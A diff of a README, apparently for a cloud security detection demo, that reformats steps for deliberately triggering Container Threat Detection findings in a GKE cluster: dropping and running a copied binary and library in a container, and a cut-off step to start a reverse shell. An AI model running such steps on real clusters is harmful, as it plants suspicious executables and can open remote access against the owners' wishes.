@@ -44,25 +44,25 @@ series. Otherwise, you might experience Terraform state snapshot lock errors.
 
 While several findings will automatically trigger during the deployment, the following instructions can be leveraged to trigger Container Threat Detection and Data exfiltration findings.
 
-Set variables 
+- Set variables 
 ```
 export PROJECT_ID=YOUR_PROJECT_ID
 export GKE_CLUSTER=YOUR_GKE_CLUSTER_NAME
 ```
-Download Cluster credentials
+- Download Cluster credentials
 ```
 gcloud container clusters get-credentials $GKE_CLUSTER \
  --zone us-central1 \
  --project $PROJECT_ID
 ```
-Add a binary to a running container
+- Add a binary to a running container
 ```
 tag="dropped-binary-$(date +%Y-%m-%d-%H-%M-%S)"
 kubectl run --restart=Never --rm=true --wait=true -i \
 --image marketplace.gcr.io/google/ubuntu1804:latest \
 "$tag" -- bash -c "cp /bin/ls /tmp/$tag; /tmp/$tag"
 ```
-Add a library to a running container
+- Add a library to a running container
 ```
 tag="dropped-library-$(date +%Y-%m-%d-%H-%M-%S)"
 kubectl run --restart=Never --rm=true --wait=true -i \
@@ -70,7 +70,7 @@ kubectl run --restart=Never --rm=true --wait=true -i \
 "$tag" -- bash -c "cp /lib/x86_64-linux-gnu/libc.so.6 /tmp/$tag; /lib64/ld-linux-x86-64.so.2 /tmp/$tag"
 ```
 
-Start a reverse shell in running container
+- Start a reverse shell in running container
 ```
 tag="reverse-shell-$(date +%Y-%m-%d-%H-%M-%S)"
 kubectl run --restart=Never --rm=true --wait=true -i \
